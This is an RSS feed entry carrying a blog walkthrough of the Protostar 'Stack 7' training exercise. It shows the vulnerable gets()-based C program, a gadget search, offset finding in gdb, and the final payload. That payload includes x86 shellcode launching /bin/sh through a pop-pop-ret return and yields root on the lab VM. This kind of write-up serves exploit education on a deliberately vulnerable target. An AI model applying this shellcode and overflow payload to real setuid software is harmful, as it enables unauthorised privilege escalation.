@@ -1,0 +1,174 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Ret2text on Matt Andreko</title>
+    <link>https://www.mattandreko.com/categories/ret2text/index.xml</link>
+    <description>Recent content in Ret2text on Matt Andreko</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-US</language>
+    <atom:link href="https://www.mattandreko.com/categories/ret2text/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Exploit Exercises - Protostar Stack 7</title>
+      <link>https://www.mattandreko.com/blog/2012-01-09-exploit-exercises-protostar-stack-7/</link>
+      <pubDate>Mon, 09 Jan 2012 18:36:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-01-09-exploit-exercises-protostar-stack-7/</guid>
+      <description>&lt;p&gt;Welcome everyone to 2012! I took a bit of a break during these holidays, and am just starting to get back going.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://exploit-exercises.com/protostar/stack7&#34;&gt;This challenge&lt;/a&gt; was very interesting to me.  I figured it would build off of the previous one.  However, it was its own standalone challenge.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;We are given the following code to the stack7 executable:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+char *getpath()
+{
+ char buffer[64];
+ unsigned int ret;
+
+ printf(&amp;quot;input path please: &amp;quot;); fflush(stdout);
+
+ gets(buffer);
+
+ ret = __builtin_return_address(0);
+
+ if((ret &amp;amp;amp; 0xb0000000) == 0xb0000000) {
+  printf(&amp;quot;bzzzt (%p)\n&amp;quot;, ret);
+  _exit(1);
+ }
+
+ printf(&amp;quot;got path %s\n&amp;quot;, buffer);
+ return strdup(buffer);
+}
+
+int main(int argc, char **argv)
+{
+ getpath();
+
+
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From tinkering with the stack7 executable, I knew I was going to do a stack overflow, and somehow needed to execute code from the stack.  However, similar to the previous challenge, there was a filter on my return address, making it so I couldn&amp;rsquo;t just jump to an address in the stack.  This meant figuring out a way around it.&lt;/p&gt;
+
+&lt;p&gt;Using the note about this being a &amp;ldquo;return to .text&amp;rdquo; exploit, I started reading up.  This is a type of exploit that uses part of the executable, albeit even a string to execute as code, because the same characters are also x86 assembler instructions.  So I went about trying to find some code that would let me essentially, &amp;ldquo;jmp esp&amp;rdquo;, or jump to the stack pointer, where I would put my shellcode.  To do this, I did the following:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfelfscan -j esp stack7
+[stack7]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This was disappointing.  At first, I thought maybe I was not using msfelfscan correctly, and had to tinker a bit.  But it just turns out, that there is no &amp;ldquo;jmp esp&amp;rdquo; in stack7.  What a bummer.  However, on a whim, I tried to see if maybe another option to msfelfscan would work:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfelfscan -p stack7
+[stack7]
+0x08048492 pop ebx; pop ebp; ret
+0x080485c7 pop edi; pop ebp; ret
+0x080485f7 pop ebx; pop ebp; ret
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is great! Some results!  Now let&amp;rsquo;s just pick one, and attempt to use it as the return address in our overflow.  I found that the EIP offset was 80 bytes, so I wired it up as so, and debugged it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;C&amp;quot;x100&#39; &amp;gt; /home/user/file
+user@protostar:~$ gdb ./stack7 --quiet
+Reading symbols from /home/user/stack7...done.
+(gdb) run &amp;lt; file
+Starting program: /home/user/stack7 &amp;lt; file
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is a good sign.  It is overwriting the EIP now with &amp;ldquo;C&amp;rdquo; values (0x43).  So now we just need to know where in the 100 &amp;ldquo;C&amp;rdquo;s the return address is going to.  To do that, I did similar process to finding an EIP offset:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&amp;quot;&#39; &amp;gt; /home/user/file
+
+user@protostar:~$ gdb ./stack7 --quiet
+Reading symbols from /home/user/stack7...done.
+(gdb) run &amp;lt; file
+Starting program: /home/user/stack7 &amp;lt; file
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x33614132 in ?? ()
+
+mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x33614132
+8
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I simply generated a unique string using pattern_create.rb to replace the 100 &amp;ldquo;C&amp;rdquo;s, and then used pattern_offset.rb to tell me the offset when gdb got a segmentation fault.  So now I know that the first 8 &amp;ldquo;C&amp;rdquo;s are just junk.  Just to verify this, I ran it again, a little differently:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;C&amp;quot;x8 . &amp;quot;D&amp;quot;x8 . &amp;quot;E&amp;quot;x100&#39; &amp;gt; file
+user@protostar:~$ gdb ./stack7 --quiet
+Reading symbols from /home/user/stack7...done.
+(gdb) run &amp;lt; file
+Starting program: /home/user/stack7 &amp;lt; file
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒CCCCCCCCDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
+
+Program received signal SIGSEGV, Segmentation fault.
+0x44444444 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This shows the 4 &amp;ldquo;D&amp;rdquo;s were properly placed, which proved to me that I was indeed going to need my buffer to look like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;| 80 bytes junk | pop-pop-ret | 8 bytes junk | address to execute |
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Since it was actually going to execute the instructions at the last dword, I opted to put my shellcode in an environmental variable, since it was easy.  I again used the same &lt;a href=&#34;http://www.exploit-db.com/exploits/13357&#34;&gt;shellcode&lt;/a&gt; for dealing with gets() as I have in the last couple challenges:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ export SHELLCODE=`perl -e &#39;print &amp;quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&amp;quot;&#39;`
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The next problem was to find out where the address would reside in memory.  I used getenvaddr.c again to show me the address.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int main(int argc, char *argv[]) {
+        char *ptr;
+        if(argc &amp;lt; 3) {
+                printf(&amp;quot;Usage: %s &amp;lt;environment var&amp;gt; &amp;lt;target program name&amp;gt;\n&amp;quot;, argv[0]);
+                exit(0);
+        }
+
+        ptr = getenv(argv[1]); /* Get env var location. */
+        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
+        printf(&amp;quot;%s will be at %p\n&amp;quot;, argv[1], ptr);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just to be sure, I went to the /opt/protostar/bin directory to do this, since I knew the address could change based on what folder I was in.  I used this to get the address of my SHELLCODE variable by doing the following:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ /home/user/getenvaddr SHELLCODE ./stack7
+SHELLCODE will be at 0xbffff985
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using this address, I exploited the stack7 executable:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;C&amp;quot;x8 . &amp;quot;\x85\xf9\xff\xbf&amp;quot;&#39; &amp;gt; /home/user/file
+user@protostar:/opt/protostar/bin$ ./stack7 &amp;lt; /home/user/file
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒CCCCCCCC▒▒▒▒
+# whoami
+root
+# id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There you have it, root access, and it was fairly easy.  This is the last challenge in the Protostar VM under the &amp;ldquo;Stack&amp;rdquo; category.  Next post you see should be a new category.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
